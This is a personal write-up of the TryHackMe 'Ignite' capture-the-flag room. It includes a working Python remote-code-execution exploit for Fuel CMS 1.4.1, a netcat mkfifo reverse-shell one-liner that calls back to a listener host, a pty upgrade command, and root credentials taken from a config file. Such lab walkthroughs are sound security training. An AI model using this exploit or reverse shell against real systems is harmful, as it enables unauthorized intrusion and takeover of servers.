***

CTF Link -  [link](https://tryhackme.com/room/ignite)
For more detailed writeup - [tryhackme_official_writeup](https://tryhackme.com/resources/blog/ignite-writeup)

***

## Lets start

*Firstly we did an nmap scan on the victim ip*
![[Pasted image 20260217004003.png]]

Here we found that it was serving on the port 80 which means it is an webapp.

Next I tried to check if there is an robots.txt and guess what, it was there
![[Pasted image 20260217004236.png]]

Here we found there was /fuel/ directory in the website.After we accessed that page so there  was an login form and i dont know the password so i didnt tried to bruteforce.But later in the homepage I found username: admin and password: admin , but there  was no need of admin.

This website was using **fuel** cms. So without wasting time I went to search for fuel cms 1.4.1 exploit and I found one on exploitdb with python code.
Exploit code:
```python
import requests
import urllib.request, urllib.parse, urllib.error

url = "http://10.48.129.59"

def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start + 1)
        n -= 1
    return start


while 1:
    xxxx = input("cmd:")
    burp0_url = (
        url
        + "/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"
        + urllib.parse.quote(xxxx)
        + "%27%29%2b%27"
    )
    r = requests.get(burp0_url)

    html = "<!DOCTYPE html>"
    htmlcharset = r.text.find(html)

    begin = r.text[0:20]
    dup = find_nth_overlapping(r.text, begin, 2)

    print(r.text[0:dup])
```

Then I ran the python code and got the shell to execute the commands.
![[Pasted image 20260217004932.png]]

**NOTE**: Make sure to give input with "" i.e when you run the exploit you'll get cmd: and there you'll have to enter the command you want to execute. Ex: Say you want to run ls then do cmd: "ls" and not cmd: ls. Notice the quotation marks around the command.

Since we have the RCE now we can easily get a reverse shell using it.
Run the following command to get a reverse shell:
```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.1 4444 >/tmp/f
```

This will give you a reverse shell on your listener which should be listening on port 4444 via nc -nlvp 4444.
![[Pasted image 20260217005121.png]]

*One thing we have to do is setting up terminal enviornment in our terminal.Do this:*
```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```


Now we can get into the /home to get user flag.
![[Pasted image 20260217005200.png]]

## Privilege escalation

After looking around for a little bit, I found the password for root: `/var/www/html/fuel/application/config/database.php`.

![[Pasted image 20260217005246.png]]

Now we found the root password which is `mememe` .

![[Pasted image 20260217005520.png]]